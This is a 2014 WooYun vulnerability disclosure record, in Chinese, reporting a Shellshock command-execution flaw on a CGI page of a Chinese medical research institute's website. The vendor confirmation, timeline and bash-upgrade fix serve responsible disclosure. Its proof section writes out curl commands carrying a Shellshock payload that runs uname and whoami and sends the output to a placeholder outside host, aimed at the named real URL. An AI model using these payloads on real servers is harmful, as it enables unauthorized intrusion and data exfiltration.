{"id": 49450, "wybug_id": "wooyun-2014-078387", "wybug_title": "中国医学科学院病原生物学研究所官网存在破壳漏洞", "wybug_corp": "中科院", "wybug_author": "ki04dc", "wybug_date": "2014-10-08 12:08", "wybug_open_date": "2014-11-22 12:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["破壳"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向公众公开  简要描述： RT 详细说明：  中国医学科学院病原生物学研究所官网：漏洞链接：http://www.mgc.ac.cn/cgi-bin/VFs/compVFs/compvfs.cgi?Genus=Mycobacterium存在破壳漏洞，可执行任意命令。    漏洞证明：  \n\ncurl -A \"() { :;}; /usr/bin/curl 'http://xxx/`/bin/uname -a`'\"  \"http://www.mgc.ac.cn/cgi-bin/VFs/compvfs.cgi?Genus=Mycobacterium\" >1curl -A \"() { :;}; /usr/bin/curl 'http://xxx/`/usr/bin/whoami`'\"  \"http://www.mgc.ac.cn/cgi-bin/VFs/compvfs.cgi?Genus=Mycobacterium\" >1可以看到user是azureuser,应该是微软云，权限还不小。比较有意思的是，curl回来的ip和nslookup解析的ip不一样，但是网站应该是没有负载均衡的，估计是微软云做的处理，和很多大的互联网公司的网络架构很相似。很少玩云主机，不知道其他的云主机是不是也这样的。   修复方案：  升级bash到最新版本   版权声明：转载请注明来源 ki04dc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-10-11 17:23 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}